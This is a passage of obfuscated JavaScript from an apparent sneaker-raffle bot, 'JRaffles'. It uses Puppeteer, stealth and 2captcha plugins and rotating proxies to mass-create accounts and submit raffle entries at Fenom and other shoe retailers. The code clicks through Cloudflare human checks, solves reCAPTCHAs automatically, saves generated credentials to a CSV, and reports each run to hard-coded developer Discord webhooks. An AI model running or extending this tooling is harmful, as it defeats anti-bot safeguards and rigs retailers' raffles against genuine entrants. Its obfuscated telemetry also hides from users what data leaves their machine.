            const _0x83b0e4 = {
                'succesDEVMSG': { 'embeds': [_0x278f96] },
                'succesPUBMSG': { 'embeds': [_0x3343ff] }
            };
            try {
                _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x83b0e4['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x83b0e4['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x45d3b5, _0x83b0e4['succesPUBMSG']);
            } catch (_0x3fffef) {
                console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3fffef));
            }
        } catch (_0x2b78c3) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20' + _0x2b78c3)), _0x426b97 = 'yes', _0x2aae9e = '' + _0x2b78c3;
            var _0x4f53ea = await _0x555e75(_0x1a36c1[_0x86a2e4], _0x3a9092, 'dev', !![], _0x2aae9e), _0x278f96 = await _0x555e75(_0x1a36c1[_0x86a2e4], _0x3a9092, 'dev', ![]), _0x3343ff = await _0x555e75(_0x1a36c1[_0x86a2e4], _0x3a9092, 'pub', ![]);
            const _0x3941dd = {
                'succesDEVMSG': { 'embeds': [_0x278f96] },
                'succesPUBMSG': { 'embeds': [_0x3343ff] }
            };
            _0x3941dd['errorDEV'] = { 'embeds': [_0x4f53ea] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x3941dd['errorDEV']), await _0x57e113(_0x570583, _0x3941dd['errorDEV']);
        } finally {
            _0x268f21['close']();
            if (_0x426b97 == 'yes' && _0x2f9208 != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Task\x20' + (_0x86a2e4 + 0x1) + '\x20:\x20Retrying')), _0x86a2e4 = _0x86a2e4 - 0x1, _0x2f9208 = _0x2f9208 + 0x1;
                continue;
            }
            _0x426b97 == 'yes' && _0x2f9208 >= 0x5 && (_0x254c07(_0x1a36c1[_0x86a2e4], _0x3a9092), _0x426b97 = 'no', _0x2f9208 = 0x0), console['log'](_0x561248() + '\x20[' + _0x3a9092['name'] + ']\x20Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x4fd15b(_0x2db663, _0xed62b5, _0x4f5d44) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x46fd14 = 0x0; _0x46fd14 < _0x2db663['length']; _0x46fd14++) {
        if (_0x1a133e != 'yes')
            var _0x1a133e = '', _0x38cd23 = 0x0;
        var _0x6b4530;
        await _0x3cdb09(_0x2db663, _0x46fd14), _0x2768f8(_0x4f5d44['name'] + '\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20/\x20' + _0x2db663['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        var _0xcfd636 = await _0x555e75(_0x2db663[_0x46fd14], _0x4f5d44, 'acc', ![]);
        const _0x450e0d = { 'succesDEVMSG': { 'embeds': [_0xcfd636] } }, _0x153bd5 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x51e054 = Math['round'](Math['random']() * (_0xed62b5['length'] - 0x1)), _0x4df0c2 = _0xed62b5[_0x51e054]['split'](':'), _0x1dbd50;
        try {
            _0x1dbd50 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4df0c2[0x0] + ':' + _0x4df0c2[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x1dbd50 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x4df0c2[0x0] + ':' + _0x4df0c2[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x53644d = await _0x1dbd50['newPage']();
            await _0x53644d['setViewport']({
                'width': 0x500 + _0x51cb94(0x1, 0x32),
                'height': 0x2d9 + _0x51cb94(0x1, 0x32)
            });
            const _0x56e392 = await _0x53644d['target']()['createCDPSession'](), { windowId: _0x31d5ae } = await _0x56e392['send']('Browser.getWindowForTarget');
            await _0x53644d['authenticate']({
                'username': '' + _0x4df0c2[0x2],
                'password': '' + _0x4df0c2[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x53644d['goto']('' + _0x153bd5, { 'waitUntil': 'networkidle2' }), await _0x1b3ea1(0x1388), console['log'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x1fc7c3 = await _0x53644d['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x1fc7c3 && await _0x1fc7c3['click']();
            } catch {
            }
            await _0x56e392['send']('Browser.setWindowBounds', {
                'windowId': _0x31d5ae,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x53644d['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x1b3ea1(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x53644d['type']('input[name=\x22firstname\x22]', '' + _0x2db663[_0x46fd14]['FirstName']), await _0x1b3ea1(0x1f4), await _0x53644d['type']('input[name=\x22lastname\x22]', '' + _0x2db663[_0x46fd14]['LastName']), await _0x1b3ea1(0x1f4), await _0x53644d['type']('input[name=\x22email\x22]', '' + _0x2db663[_0x46fd14]['Email']), await _0x1b3ea1(0x1f4), await _0x53644d['type']('input[name=\x22password\x22]', '' + _0x2db663[_0x46fd14]['Password']), await _0x1b3ea1(0x258), await _0x53644d['$eval']('input[name=\x22psgdpr\x22]', _0x5998b7 => _0x5998b7['click']()), await _0x1b3ea1(0x1f4), console['log'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x53644d['$eval']('#customer-form', _0x37af90 => _0x37af90['submit']());
            try {
                await _0x53644d['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x1a133e = 'no', console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Account\x20' + _0x2db663[_0x46fd14]['Email'] + '\x20Generated')), _0x16016b['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2db663[_0x46fd14]['Email'] + ',' + _0x2db663[_0x46fd14]['Password']);
                try {
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x450e0d['succesDEVMSG']);
                } catch {
                }
                await _0x57e113(_0x4f5698, _0x450e0d['succesDEVMSG']);
            } catch (_0x467c09) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x467c09);
            }
        } catch (_0x187ad2) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20' + _0x187ad2)), _0x6b4530 = '' + _0x187ad2;
            var _0x50ec8f = await _0x555e75(_0x2db663[_0x46fd14], _0x4f5d44, 'acc', !![], _0x6b4530);
            _0x450e0d['errorDEV'] = { 'embeds': [_0x50ec8f] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x450e0d['errorDEV']), await _0x57e113(_0x570583, _0x450e0d['errorDEV']), _0x1a133e = 'yes';
        } finally {
            _0x1dbd50['close']();
            if (_0x1a133e == 'yes' && _0x38cd23 != 0x5 && _0x6b4530 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Task\x20' + (_0x46fd14 + 0x1) + '\x20:\x20Retrying')), _0x46fd14 = _0x46fd14 - 0x1, _0x38cd23 = _0x38cd23 + 0x1;
                continue;
            }
            _0x1a133e == 'yes' && _0x38cd23 >= 0x5 && (_0x254c07(_0x2db663[_0x46fd14], _0x4f5d44), _0x1a133e = 'no', _0x38cd23 = 0x0), console['log'](_0x561248() + '\x20[' + _0x4f5d44['name'] + ']\x20Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x444f61(_0x57c905, _0x20dcc9, _0x1c8863) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x20e4e1 = 0x0; _0x20e4e1 < _0x57c905['length']; _0x20e4e1++) {
        if (_0x8febdb != 'yes')
            var _0x8febdb = '', _0x2f602d = 0x0;
        var _0x5b5925;
        await _0x3cdb09(_0x57c905, _0x20e4e1), _0x2768f8(_0x1c8863['name'] + '\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20/\x20' + _0x57c905['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247);
        const _0x5ca711 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x268d47 = Math['round'](Math['random']() * (_0x20dcc9['length'] - 0x1)), _0x42086b = _0x20dcc9[_0x268d47]['split'](':'), _0x488893;
        try {
            _0x488893 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x42086b[0x0] + ':' + _0x42086b[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x488893 = await _0x114f6['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x42086b[0x0] + ':' + _0x42086b[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x540535 = await _0x488893['newPage'](), _0x4a1b6e = await _0x540535['target']()['createCDPSession'](), { windowId: _0x1c75e6 } = await _0x4a1b6e['send']('Browser.getWindowForTarget');
            await _0x540535['authenticate']({
                'username': '' + _0x42086b[0x2],
                'password': '' + _0x42086b[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x540535['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1b3ea1(0xbb8), await _0x4a1b6e['send']('Browser.setWindowBounds', {
                'windowId': _0x1c75e6,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x1b3ea1(0x1f40);
            try {
                await _0x540535['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x1b3ea1(0x1388), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x540535['type']('input[name=\x22email\x22]', '' + _0x57c905[_0x20e4e1]['Email']), await _0x1b3ea1(0x1f4), await _0x540535['type']('input[name=\x22password\x22]', '' + _0x57c905[_0x20e4e1]['Password']), await _0x1b3ea1(0x258), await _0x540535['$eval']('#login-form', _0x1f8a33 => _0x1f8a33['submit']()), await _0x540535['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1b3ea1(0x1f4), await _0x540535['goto']('' + _0x57c905[_0x20e4e1]['Url']), await _0x540535['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x57c905[_0x20e4e1]['Size']);
            if (_0x57c905[_0x20e4e1]['Size'] != 'RANDOM') {
                var _0x522ea0 = '\x20' + _0x57c905[_0x20e4e1]['Size'] + '\x20';
                const _0x507aa7 = await _0x540535['$x']('//span[contains(text(),\x20' + _0x522ea0 + ')]');
                await _0x507aa7[0x0]['click']();
            } else {
                const _0x1197aa = await _0x540535['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x2aa484 = Math['round'](Math['random']() * (_0x1197aa['length'] - 0x1));
                await _0x1197aa[_0x2aa484]['click']();
            }
            await _0x1b3ea1(0x258), await _0x540535['click']('#cookieChoiceDismiss'), await _0x1b3ea1(0x3e8), await _0x540535['type']('#instagram-account', '' + _0x57c905[_0x20e4e1]['Follower']), await _0x1b3ea1(0x28a), await _0x540535['click']('#book-btn'), await _0x1b3ea1(0xbb8), await _0x540535['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x1b3ea1(0x1f4), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20' + _0x3e492c['cyan']('Solving\x20Captcha')), await _0x540535['solveRecaptchas'](), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1b3ea1(0x7d0), await _0x540535['$eval']('#book-btn-for-sure', _0x39faec => _0x39faec['click']()), await _0x1b3ea1(0x12c), await _0x540535['click']('#book-btn-for-sure'), await _0x1b3ea1(0xdac);
            const _0x109609 = await _0x540535['$eval']('.reservation-popup\x20>\x20.title', _0x4d96ea => {
                return _0x4d96ea['innerHTML'];
            });
            if (_0x109609) {
                _0x8febdb = 'no', _0x1dc885(_0x57c905[_0x20e4e1], _0x1c8863), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x255e90 = await _0x555e75(_0x57c905[_0x20e4e1], _0x1c8863, 'dev', ![]), _0x229f10 = await _0x555e75(_0x57c905[_0x20e4e1], _0x1c8863, 'pub', ![]);
                const _0x17e441 = {
                    'succesDEVMSG': { 'embeds': [_0x255e90] },
                    'succesPUBMSG': { 'embeds': [_0x229f10] }
                };
                try {
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x17e441['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x17e441['succesDEVMSG']), await _0x1b3ea1(0xc8), await _0x57e113(_0x45d3b5, _0x17e441['succesPUBMSG']);
                } catch (_0x34e602) {
                    console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x34e602));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x1335b5) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20' + _0x1335b5)), _0x5b5925 = '' + _0x1335b5;
            var _0x5dd9c0 = await _0x555e75(_0x57c905[_0x20e4e1], _0x1c8863, 'dev', !![], _0x5b5925), _0x255e90 = await _0x555e75(_0x57c905[_0x20e4e1], _0x1c8863, 'dev', ![]), _0x229f10 = await _0x555e75(_0x57c905[_0x20e4e1], _0x1c8863, 'pub', ![]);
            const _0x3e70f1 = {
                'succesDEVMSG': { 'embeds': [_0x255e90] },
                'succesPUBMSG': { 'embeds': [_0x229f10] }
            };
            _0x3e70f1['errorDEV'] = { 'embeds': [_0x5dd9c0] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x3e70f1['errorDEV']), await _0x57e113(_0x570583, _0x3e70f1['errorDEV']), _0x1335b5 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x8febdb = 'yes');
        } finally {
            _0x488893['close']();
            if (_0x8febdb == 'yes' && _0x2f602d != 0x5 && _0x5b5925 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Task\x20' + (_0x20e4e1 + 0x1) + '\x20:\x20Retrying')), _0x20e4e1 = _0x20e4e1 - 0x1, _0x2f602d = _0x2f602d + 0x1;
                continue;
            }
            _0x8febdb == 'yes' && _0x2f602d >= 0x5 && (_0x254c07(_0x57c905[_0x20e4e1], _0x1c8863), _0x8febdb = 'no', _0x2f602d = 0x0), console['log'](_0x561248() + '\x20[' + _0x1c8863['name'] + ']\x20Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x39cf44() {
    await _0x36d402(), console['clear']();
    if (_0x44c289 != 'devkey') {
        let _0x1139ca = await _0x5c8429['autoUpdate']();
        if (_0x1139ca === 'yes')
            return _0x1b0644('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x5823f0 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1b3ea1(0x2710);
        ;
    }
    await _0x4ea601(_0x5823f0);
    if (_0x47001b === ![])
        return console['log']('Closing\x20Browser'), await _0x1b3ea1(0xbb8);
    else
        try {
            var _0x5868c8 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x57b088
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x44c289
                    }
                ]
            }];
            const _0x4ea058 = { 'embeds': _0x5868c8 };
            var _0x21e975 = await _0x555e75(null, null, 'open', ![]);
            const _0x57fbd8 = { 'openDEVMSG': { 'embeds': [_0x21e975] } };
            await _0x57e113(_0xc733a, _0x57fbd8['openDEVMSG']);
            async function _0x303f4f() {
                _0x2768f8('JRaffles\x20' + _0x44c289), console['clear'](), console['log']('Welcome\x20to\x20' + _0x3e492c['cyan']('JRaffles();') + '\x20' + _0x44c289), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x432494 = 0x0; _0x432494 < _0x5c60fc['length'] - 0x3; _0x432494++) {
                    if (_0x5c60fc[_0x432494]['name'] === 'Reload\x20Settings' || _0x5c60fc[_0x432494]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x432494 + ')\x20[' + _0x5c60fc[_0x432494]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x5c60fc['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x5c60fc['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x5c60fc['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2f38dc();
                if (taskModule > _0x5c60fc['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1b3ea1(0x3e8), _0x303f4f();
                if (_0x5c60fc[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                    var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x4f8242 = await _0x3624ea(), _0x4d7a95 = await _0x50f62c();
                        await _0x1b89d9(_0x4d7a95, _0x4f8242, _0x51cce0);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x4f8242 = await _0x3624ea(), _0x4d7a95 = await _0x50f62c();
                            await _0x4bfd99(_0x4d7a95, _0x4f8242, _0x51cce0);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4f8242 = await _0x3624ea(), _0x483eab = await _0x8ed0fa(), _0x7f3626 = _0x483eab['split'](';');
                                await _0x230c03(_0x7f3626, _0x4f8242, _0x51cce0);
                            }
                        }
                    }
                    return _0x303f4f();
                }
                if (_0x5c60fc[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                        var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4f8242 = await _0x3624ea(), _0x11d785 = await _0x50f62c();
                            await _0x444f61(_0x11d785, _0x4f8242, _0x51cce0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4f8242 = await _0x3624ea(), _0x11d785 = await _0x50f62c();
                                await _0x4fd15b(_0x11d785, _0x4f8242, _0x51cce0);
                            }
                        }
                    } catch (_0x6a9f6) {
                        console['log'](_0x6a9f6), await _0x1b3ea1(0xfa0);
                    }
                    return _0x303f4f();
                }
                if (_0x5c60fc[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                    var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4f8242 = await _0x3624ea(), _0x387e70 = await _0x50f62c();
                    if (_0x387e70[0x0]['Url'] == '' || _0x387e70[0x0]['Url'] == undefined) {
                        await _0x2891b8(_0x4f8242);
                        var _0x52cfa1 = await _0x1d2cf1();
                        return await afewFunction('' + _0x33efec[_0x52cfa1], 'nor', _0x51cce0, _0x387e70, _0x4f8242), _0x303f4f();
                    }
                    return await afewFunction(_0x387e70[0x0]['Url'], 'nor', _0x51cce0, _0x387e70, _0x4f8242), _0x303f4f();
                } else {
                    if (_0x5c60fc[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                        var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x4f8242 = await _0x3624ea(), _0x13da42 = await _0x50f62c();
                            console['log']('Starting\x20' + _0x13da42['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x1e0399 = 0x0; _0x1e0399 < _0x13da42['length']; _0x1e0399++) {
                                console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x51116d(_0x1e0399, 'nor', _0x51cce0, _0x13da42, _0x4f8242), console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Sleeping\x20for\x20' + _0xc43b8d['MahaDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['MahaDelay']);
                                } catch (_0x4e10ad) {
                                    console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Error\x20' + _0x4e10ad));
                                }
                            }
                            ;
                            return _0x303f4f();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4f8242 = await _0x3624ea();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x483eab = await _0x8ed0fa(), _0x7f3626 = _0x483eab['split'](';'), console['log'](_0x7f3626['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x1e0399 = 0x0; _0x1e0399 < _0x7f3626['length']; _0x1e0399++) {
                                    _0x51cce0['url'] = _0x7f3626[_0x1e0399], console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x51116d(_0x1e0399, 'ver', _0x51cce0, _0x13da42, _0x4f8242), console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Sleeping\x20for\x20' + _0xc43b8d['verificationDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['verificationDelay']);
                                    } catch (_0x105e84) {
                                        console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Error\x20' + _0x105e84));
                                    }
                                }
                                ;
                                return _0x303f4f();
                            }
                        }
                    } else {
                        if (_0x5c60fc[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                            var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction], _0x4f8242 = await _0x3624ea(), _0x3a7194 = await _0x50f62c();
                            return await _0x1e4d9b(_0x3a7194, _0x4f8242, _0x51cce0), await _0x1b3ea1(0x1388), _0x303f4f();
                        } else {
                            if (_0x5c60fc[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                                var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x4f8242 = await _0x3624ea(), _0x2bb9f2 = await _0x50f62c();
                                    console['log']('Starting\x20' + _0x3e492c['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x1e0399 = 0x0; _0x1e0399 < _0x2bb9f2['length']; _0x1e0399++) {
                                        console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x1594fd(_0x1e0399, 'nor', _0x51cce0, _0x2bb9f2, _0x4f8242);
                                        } catch (_0x48a2f0) {
                                            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Task\x20failed\x20' + _0x48a2f0));
                                        }
                                        console['log'](_0x561248() + '\x20[' + _0x51cce0['name'] + ']\x20Sleeping\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
                                    }
                                    return _0x303f4f();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x4f8242 = await _0x3624ea();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x483eab = await _0x8ed0fa(), _0x7f3626 = _0x483eab['split'](';'), console['log'](_0x7f3626['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x1e0399 = 0x0; _0x1e0399 < _0x7f3626['length']; _0x1e0399++) {
                                            try {
                                                _0x51cce0['url'] = _0x7f3626[_0x1e0399], console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x1e0399 + 0x1) + ':\x20Getting\x20Session'), await _0x1594fd(_0x1e0399, 'ver', _0x51cce0, null, _0x4f8242), console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0xc43b8d['verificationDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['verificationDelay']);
                                            } catch (_0x4829c6) {
                                                console['log'](_0x4829c6), await _0x1b3ea1(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x303f4f();
                                    }
                                }
                                ;
                            } else {
                                if (_0x5c60fc[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                                    var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x2eb833('https://bouncewear.com/nl/account/register', _0x51cce0);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x5c60fc[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
                                        var _0x51cce0 = _0x5c60fc[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x4f8242 = await _0x3624ea(), _0x4e1803 = await _0x50f62c();
                                            return await _0x1bfc79('https://patta.nl/account/register', _0x51cce0, _0x4e1803, _0x4f8242), _0x303f4f();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x4f8242 = await _0x3624ea(), _0x4e1803 = await _0x50f62c();
                                                return await _0x57c2ca('', _0x51cce0, _0x4e1803, _0x4f8242), _0x303f4f();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x5c60fc[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x54642f(_0x5c60fc[taskModule]['modules']);
